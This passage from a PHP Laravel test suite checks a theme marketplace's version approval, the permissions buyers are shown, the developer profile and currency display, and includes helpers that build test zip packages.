        $this->artisan('nuvabill:marketplace-publish', ['listing' => [$this->dir.'/listing.json']])->assertFailed();
        $this->assertSame(0, MarketplaceItem::query()->count());
    }

    public function test_approving_an_older_pending_version_keeps_the_live_permissions(): void
    {
        $item = $this->item('paper', 'theme', 0);
        $uploader = app(VersionUploader::class);
        app(ItemPublisher::class)->approve($uploader->upload($item, $this->zip('paper', '1.0.0', 'theme.json', ['requires' => '>=0.3.0'])));
        $newer = $uploader->upload($item->refresh(), $this->zip('paper', '1.2.0', 'theme.json', ['requires' => '>=0.3.0', 'permissions' => ['http:collector.example']]));
        $older = $uploader->upload($item->refresh(), $this->zip('paper', '1.1.0', 'theme.json', ['requires' => '>=0.3.0', 'permissions' => []]));
        $this->assertSame(MarketplaceVersion::STATUS_PENDING, $newer->status);
        $this->assertSame(MarketplaceVersion::STATUS_PENDING, $older->status);

        $this->signInAdmin();
        $this->post(route('admin.store.reviews.approve', $newer))->assertRedirect(route('admin.store.reviews.index'));
        $this->post(route('admin.store.reviews.approve', $older))->assertSessionHas('error');
        $this->assertSame(MarketplaceVersion::STATUS_PENDING, $older->fresh()->status);
        $this->post(route('admin.store.reviews.approve', $newer))->assertSessionHas('error');

        // Approved another way, an older version still does not change what buyers are told.
        app(ItemPublisher::class)->approve($older->fresh());
        $item->refresh();
        $this->assertSame('1.2.0', $item->latestVersion->version);
        $this->assertSame(['http:collector.example'], $item->permissions);
        $this->assertSame(['http:collector.example'], app(StoreCatalog::class)->present($item)['permissions']);
    }

    public function test_saving_the_developer_profile_keeps_the_bio(): void
    {
        $client = $this->client();
        $this->actingAs($client, 'web')->post(route('developer.join.store'), ['name' => 'Raz Studio', 'bio' => 'Themes for hosting companies.', 'agree' => '1']);

        $this->put(route('developer.profile'), ['name' => 'Raz Studio', 'website' => 'https://example.test', 'payout_method' => 'fib'])->assertSessionHas('status');

        $developer = $client->fresh()->developer;
        $this->assertSame('Themes for hosting companies.', $developer->bio);
        $this->assertSame('fib', $developer->payout_method);
    }

    public function test_the_price_split_shows_the_item_currency(): void
    {
        $this->setSettings(['billing.currency' => 'EUR']);
        $client = $this->joinAsDeveloper();

        $this->get(route('developer.items.create'))->assertOk()
            ->assertSee("currency: 'EUR'", false)
            ->assertDontSee("'$' + Number(price)", false);

        $item = $this->item('glow', 'theme', 0);
        $item->update(['developer_id' => $client->fresh()->developer->id]);
        $this->get(route('developer.items.show', $item))->assertOk()->assertSee("currency: 'USD'", false);
    }

    private function client(): Client
    {
        return Client::factory()->create(['first_name' => 'Mer', 'last_name' => 'Las', 'company_name' => null]);
    }

    private function joinAsDeveloper(string $name = 'Raz Studio'): Client
    {
        $client = $this->client();
        $this->actingAs($client, 'web')->post(route('developer.join.store'), ['name' => $name, 'agree' => '1'])->assertRedirect(route('developer.dashboard'));

        return $client;
    }

    /**
     * Order the item for billing.example.org and return the unpaid invoice.
     */
    private function buy(MarketplaceItem $item): Invoice
    {
        $this->actingAs($this->client(), 'web')->post(route('cart.store'), ['product_id' => $item->product_id, 'billing_cycle' => 'annually', 'domain' => 'billing.example.org']);
        $this->post(route('checkout.store'))->assertRedirect();

        return Order::query()->latest('id')->firstOrFail()->invoice;
    }

    /**
     * Fetch a signed download link and keep the file.
     */
    private function downloadTo(string $url, string $name): string
    {
        $file = $this->get($url)->assertOk();
        $path = $this->dir.'/'.$name;
        file_put_contents($path, $file->streamedContent() ?: (string) file_get_contents($file->baseResponse->getFile()->getPathname()));

        return $path;
    }

    private function item(string $slug, string $type, int $price, int $updatePrice = 0): MarketplaceItem
    {
        $developer = Developer::query()->firstOrCreate(['slug' => 'nuvabill'], ['name' => 'Nuvabill', 'is_official' => true, 'status' => 'active']);

        return $developer->items()->create(['slug' => $slug, 'type' => $type, 'name' => ucfirst($slug), 'summary' => 'Test item.', 'price' => $price, 'update_price' => $updatePrice, 'currency' => 'USD', 'status' => MarketplaceItem::STATUS_DRAFT]);
    }

    private function liveItem(string $slug, string $type, int $price, int $updatePrice): MarketplaceItem
    {
        $item = $this->item($slug, $type, $price, $updatePrice);
        $manifest = $type === 'orderform' ? 'orderform.json' : 'theme.json';
        $version = app(VersionUploader::class)->upload($item, $this->zip($slug, '1.0.0', $manifest, ['requires' => '>=0.3.0', 'paid' => true]));
        app(ItemPublisher::class)->approve($version);

        return $item->refresh();
    }

    /**
     * @param  array<string, mixed>  $manifest
     * @param  array<string, string>  $files
     */
    private function zip(string $slug, string $version, string $manifestFile, array $manifest = [], array $files = []): string
    {
        $path = $this->dir.'/'.$slug.'-'.$version.'-'.uniqid().'.zip';
        $zip = new ZipArchive;
        $zip->open($path, ZipArchive::CREATE);
        $zip->addFromString($manifestFile, (string) json_encode($manifest + ['slug' => $slug, 'name' => ucfirst($slug), 'version' => $version]));
        $zip->addFromString('views/layouts/app.blade.php', '<html></html>');

        foreach ($files as $name => $contents) {
            $zip->addFromString($name, $contents);
        }

        $zip->close();

        return $path;
    }

    private function upload(string $path): UploadedFile
    {
        return new UploadedFile($path, basename($path), 'application/zip', null, true);
    }
}
